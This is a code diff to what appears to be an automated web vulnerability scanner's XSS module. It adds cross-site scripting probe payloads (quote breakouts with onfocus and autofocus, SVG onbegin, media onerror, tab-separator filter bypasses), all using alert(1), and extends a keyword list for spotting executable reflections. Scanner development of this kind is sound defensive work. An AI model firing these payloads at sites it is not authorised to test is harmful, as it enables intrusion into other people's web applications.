@@ -38,6 +38,17 @@ class XSSModule(BaseModule):
             'xploit"><math><mtext><option><annotation encoding="text/html"><svg/onload=alert(1)></annotation></option></mtext></math>',
             '<object data="javascript:alert(1)">',
             '<embed src="javascript:alert(1)">',
+            # Event-handler attribute context probes — reflections landing
+            # inside quoted attribute values or breakouts that inject new
+            # handler attributes
+            "xploit' onfocus='alert(1)",              # single-quote attr breakout
+            'xploit" autofocus onfocus="alert(1)',     # breakout + no-interaction pair
+            '<input autofocus onfocus=alert(1)>',      # autofocus fires onfocus on load
+            '<select autofocus onfocus=alert(1)>',     # alternate autofocus carrier
+            'xploit" onpointerover="alert(1)',         # modern pointer handler breakout
+            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',  # SMIL onbegin (Firefox)
+            '<audio src=x onerror=alert(1)>',          # media-tag onerror carrier
+            '<img src=x\tonerror=alert(1)>',           # tab separator vs space-based filters
         ]
         for payload in payloads:
             for url in list(self.scanner.pages):
@@ -164,7 +175,8 @@ class XSSModule(BaseModule):
         # benign string into an executable context is not XSS.
         if not any(p in payload.lower() for p in ["<svg", "<img", "<script", "onerror",
                                                   "onload", "ontoggle", "onmouseover",
-                                                  "onstart", "javascript:"]):
+                                                  "onfocus", "autofocus", "onpointerover",
+                                                  "onbegin", "onstart", "javascript:"]):
             return None
         return context_desc
 
